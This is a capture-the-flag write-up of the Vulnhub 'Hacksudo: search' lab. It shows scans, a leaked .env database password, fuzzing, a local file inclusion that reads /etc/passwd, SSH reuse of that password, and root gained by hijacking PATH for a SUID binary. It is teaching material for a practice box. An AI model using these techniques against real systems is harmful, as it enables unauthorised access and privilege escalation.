---
title:  "Hacksudo: search"
author: am-a-circle
date: 2021-04-15 12:00:00 
categories: [Vulnhub]
tags: [Path Variable,easy]
math: false
mermaid: false
---

## Overview



|Box Difficulty| Link|
|--|--|
| Easy | [Vulnhub Link](https://www.vulnhub.com/entry/hacksudo-search,683/) |

For this box I downloaded it off vulnhub and run it on my network!

## Recon

Let's start begin with our standard enumeration process to find out all the open ports.

This time let's use nmap to find all open ports

```bash
┌──(root💀kali)-[~]
└─# nmap 192.168.56.8 -p-                                                                                                                   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 02:08 EDT
Nmap scan report for 192.168.56.8
Host is up (0.00016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:2F:78:D3 (Oracle VirtualBox virtual NIC)
```


```bash
└─# nmap -sV -sC -p 22,80 192.168.56.8       
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-16 02:09 EDT
Nmap scan report for 192.168.56.8
Host is up (0.00026s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 7b:44:7c:da:fb:e5:e6:1d:76:33:eb:fa:c0:dd:77:44 (RSA)
|   256 13:2d:45:07:32:83:13:eb:4e:a1:20:f4:06:ba:26:8a (ECDSA)
|_  256 21:a1:86:47:07:1b:df:b2:70:7e:d9:30:e3:29:c2:e7 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: HacksudoSearch
MAC Address: 08:00:27:2F:78:D3 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds




```

Really nothing much to work on. But let's enumerate common ports more.

## HTTP- TCP 80

Nikto show that they found a .env file.
```bash
└─# nikto -ask=no -h 192.168.56.8:80 2>&1 | tee nikto_P80.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.8
+ Target Hostname:    192.168.56.8
+ Target Port:        80
+ Start Time:         2021-05-16 02:14:02 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.0.1".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /account/: Directory indexing found.
+ OSVDB-3092: /account/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /.env: .env file found. The .env file may contain credentials.
+ 7915 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-05-16 02:14:52 (GMT-4) (50 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

.env File contents:
```
APP_name=HackSudoSearch
APP_ENV=local
APP_key=base64:aGFja3N1ZG8gaGVscCB5b3UgdG8gbGVhcm4gQ1RGICwgY29udGFjdCB1cyB3d3cuaGFja3N1ZG8uY29tL2NvbnRhY3QK
APP_DEBUG=false
APP_URL=http://localhost

LOG_CHANNEL=stack

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_USERNAME=hiraman
DB_PASSWORD=MyD4dSuperH3r0!
```
We found a user and password `MyD4dSuperH3r0!`. Trying to SSH with the credential above fails.

Further enumeration shows a interesting file called `search1.php`
```
└─# gobuster dir -u http://192.168.56.8:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 100 -e -k -s 200,204,301,302,307,403,500 -x txt,html,php,php.bak,bak,jsp -o gobuster_p80.txt                                                                                                                                  
===============================================================                                                                                                           
Gobuster v3.1.0                                                                      
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                             
===============================================================                      
[+] Url:                     http://192.168.56.8:80                                                                                                                       
[+] Method:                  GET                                                                                                                                          
[+] Threads:                 100                                                                                                                                          
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt                                                                         
[+] Negative Status codes:   404                                                                                                                                          
[+] User Agent:              gobuster/3.1.0                                                                                                                               
[+] Extensions:              txt,html,php,php.bak,bak,jsp                                                                                                                 
[+] Expanded:                true                                                                                                                                         
[+] Timeout:                 10s                                                                                                                                          
===============================================================                                                                                                           
2021/05/16 02:30:44 Starting gobuster in directory enumeration mode                                                                                                       
===============================================================                                                                                                           
http://192.168.56.8:80/submit.php           (Status: 200) [Size: 165]                                                                                                     
http://192.168.56.8:80/assets               (Status: 301) [Size: 313] [--> http://192.168.56.8/assets/]                                                                   
http://192.168.56.8:80/account              (Status: 301) [Size: 314] [--> http://192.168.56.8/account/]                                                                  
http://192.168.56.8:80/search.php           (Status: 200) [Size: 165]                                                                                                     
http://192.168.56.8:80/images               (Status: 301) [Size: 313] [--> http://192.168.56.8/images/]                                   
http://192.168.56.8:80/index.php            (Status: 200) [Size: 715]                                                                                                     
http://192.168.56.8:80/javascript           (Status: 301) [Size: 317] [--> http://192.168.56.8/javascript/]                               
http://192.168.56.8:80/robots.txt           (Status: 200) [Size: 75]                                                                                                      
http://192.168.56.8:80/LICENSE              (Status: 200) [Size: 1074]                                                                    
http://192.168.56.8:80/search1.php          (Status: 200) [Size: 2918]                                                                                                    
http://192.168.56.8:80/server-status        (Status: 403) [Size: 277]                                                                  
http://192.168.56.8:80/crawler.php          (Status: 500) [Size: 0]   
```
Looking through the source code:

```
<title>                                                                                                                                                                   
Hacksudo::search                                                                                                                                                          
</title>                                                                                                                                                                  
</head>                                                                                                                                                                   
<body style="background-color:Navy;">                                                                                                                                     
<!-- find me @hacksudo.com/contact @fuzzing always best option :)  -->                                                                                                    
<font color=white>                                                                                                                                                        
                                                                                                                                                                          
<div class="topnav">                                                                                                                                                      
  <a class="active" href="?find=home.php">Home</a>                                                                                                                        
  <a href="?Me=about.php">About</a>                                                                                                                                       
  <a href="?FUZZ=contact.php">Contact</a>                                                                                                                                 
  <div class="search-container">                                                                                                                                          
    <form action="submit.php">                                                                                                                                            
      <input type="text" placeholder="Search.." name="search">                                                                                                            
      <button type="submit"><i class="fa fa-search"></i></button>                                                                                                         
    </form>
  </div>
</div>


Hint to Fuzz:
```
Looks like there is a hint to do some fuzzing.

## Shell as Hacksudo

Fuzzing with fuzzer:
```bash
└─# ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://192.168.56.8/search1.php?FUZZ=contact.php -fs 2918

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.8/search1.php?FUZZ=contact.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 2918
________________________________________________

me                      [Status: 200, Size: 2203, Words: 285, Lines: 114]
:: Progress: [87664/87664] :: Job [1/1] :: 795 req/sec :: Duration: [0:01:42] :: Errors: 0 ::

```
Great, so we know we can use `me` , we can try to see if LFI is possible : [http://192.168.56.8/search1.php?me=../../../etc/passwd](http://192.168.56.8/search1.php?me=../../../etc/passwd)
```bash
curl
──(root💀kali)-[/opt/Vulnhub/hacksudosearch]
└─# curl http://192.168.56.8/search1.php?me=../../../etc/passwd                       
<html>                                                                           
<head>                               
...
...
root:x:0:0:root:/root:/bin/bash
...
...
hacksudo:x:1000:1000:hacksudo,,,:/home/hacksudo:/bin/bash
monali:x:1001:1001:,,,:/home/monali:/bin/bash
john:x:1002:1002:,,,:/home/john:/bin/bash
search:x:1003:1003:,,,:/home/search:/bin/bash
                </form>
</font>

```
Great now we have a few usernames to try the password we initially found. Which is hacksud,monali,john & search.

```bash
┌──(root💀kali)-[/opt/Vulnhub]
└─# ssh hacksudo@192.168.56.8  
hacksudo@192.168.56.8's password: 
Linux HacksudoSearch 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 15 14:10:28 2021 from 192.168.43.217
hacksudo@HacksudoSearch:~$ whoami && id && hostname
hacksudo
uid=1000(hacksudo) gid=1000(hacksudo) groups=1000(hacksudo),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
HacksudoSearch
hacksudo@HacksudoSearch:~$ cat user.txt
d045e6f9feb79e94442213f9d008ac48
       
```

Great! Shell as HacksudoSearch!

## Shell as Root

```bash
                                                                                                                                                                         
hacksudo@HacksudoSearch:/tmp$ python suid3num.py                                                                                                                          
  ___ _   _ _ ___    _____  _ _   _ __  __                                                                                                                                
 / __| | | / |   \  |__ / \| | | | |  \/  |                                                                                                                               
 \__ \ |_| | | |) |  |_ \ .` | |_| | |\/| |                                                                                                                               
 |___/\___/|_|___/  |___/_|\_|\___/|_|  |_|  twitter@syed__umar                                                                                                           
                                                                                                                                                                          
[#] Finding/Listing all SUID Binaries ..                                                                                                                                  
------------------------------                                                                                                                                            
/usr/bin/passwd                                                                                                                                                           
/usr/bin/gpasswd                                                                                                                                                          
/usr/bin/pkexec                                                                                                                                                           
/usr/bin/chfn                                                                                                                                                             
/usr/bin/umount                                                                                                                                                           
/usr/bin/mount                                                                                                                                                            
/usr/bin/newgrp                                                                                                                                                           
/usr/bin/chsh                                                                                                                                                             
/usr/bin/su                                                                                                                                                               
/usr/lib/openssh/ssh-keysign                                                                                                                                              
/usr/lib/eject/dmcrypt-get-device                                                                                                                                         
/usr/lib/policykit-1/polkit-agent-helper-1                                                                                                                                
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                               
/home/hacksudo/search/tools/searchinstall                                                                                                                                 
------------------------------                                                                                                                                            
                                                                                                                                                                          
                                                                                                                                                                          
[!] Default Binaries (Don't bother)                                                                                                                                       
------------------------------                                                                                                                                            
/usr/bin/passwd                                                                                                                                                           
/usr/bin/gpasswd                                                                                                                                                          
/usr/bin/pkexec                                                                                                                                                           
/usr/bin/chfn                                                                                                                                                             
/usr/bin/umount                                                                                                                                                           
/usr/bin/mount                                                                                                                                                            
/usr/bin/newgrp                                                                                                                                                           
/usr/bin/chsh                                                                                                                                                             
/usr/bin/su                                                                                                                                                               
/usr/lib/openssh/ssh-keysign                                                                                                                                              
/usr/lib/eject/dmcrypt-get-device                                                                                                                                         
/usr/lib/policykit-1/polkit-agent-helper-1                                                                                                                                
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
------------------------------ 
[~] Custom SUID Binaries (Interesting Stuff)
------------------------------
/home/hacksudo/search/tools/searchinstall
------------------------------


[#] SUID Binaries found in GTFO bins..
------------------------------
[!] None :(
------------------------------


[-] Note
------------------------------
If you see any FP in the output, please report it to make the script better! :)
------------------------------
```
Let's try running searchinstall, since it was highlighted.

```bash
hacksudo@HacksudoSearch:/tmp$ /home/hacksudo/search/tools/searchinstall
install: missing file operand
```
Nothing special, but looking at the file folder we can see that the program is running as root and we are able to see the source code.

```bash
hacksudo@HacksudoSearch:~/search/tools$ ls -la
total 32
drwxr-xr-x 2 hacksudo hacksudo  4096 Apr 15 02:57 .
drwxr-xr-x 4 hacksudo hacksudo  4096 Apr 14 03:50 ..
-rw-r--r-- 1 hacksudo hacksudo     0 Apr 15 02:57 file
---Sr-xr-x 1 root     root     16712 Apr 14 03:36 searchinstall
-rw-r--r-- 1 hacksudo hacksudo    78 Apr 14 03:34 searchinstall.c

hacksudo@HacksudoSearch:~/search/tools$ cat searchinstall.c
#include<unistd.h>
void main()
{       setuid(0);
        setgid(0);
        system("install");
}
```
From the source code of `searchinstall.c` we can deduce that we can use a path-variable exploit by making the program run `install` which we created which contains our command instead.

```bash
hacksudo@HacksudoSearch:~/search/tools$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
hacksudo@HacksudoSearch:~/search/tools$ echo '/bin/bash' > install
hacksudo@HacksudoSearch:~/search/tools$ chmod 777 install 
hacksudo@HacksudoSearch:~/search/tools$ export PATH=./:$PATH
hacksudo@HacksudoSearch:~/search/tools$ echo $PATH
./:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
hacksudo@HacksudoSearch:~/search/tools$ ./searchinstall 
root@HacksudoSearch:~/search/tools# whoami && id
root
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(hacksudo)
root@HacksudoSearch:~/search/tools# cd /root
root@HacksudoSearch:/root# cat 
.bashrc         .config/        .local/         notes.txt       .profile        .wget-hsts      
.cache/         .gnupg/         .mysql_history  .npm/           root.txt        
root@HacksudoSearch:/root# cat root.txt 
 _                _                  _         ____                      _     
| |__   __ _  ___| | _____ _   _  __| | ___   / ___|  ___  __ _ _ __ ___| |__  
| '_ \ / _` |/ __| |/ / __| | | |/ _` |/ _ \  \___ \ / _ \/ _` | '__/ __| '_ \ 
| | | | (_| | (__|   <\__ \ |_| | (_| | (_) |  ___) |  __/ (_| | | | (__| | | |
|_| |_|\__,_|\___|_|\_\___/\__,_|\__,_|\___/  |____/ \___|\__,_|_|  \___|_| |_|
You Successfully Hackudo search box 
rooted!!!

flag={9fb4c0afce26929041427c935c6e0879}
```

Rooted!
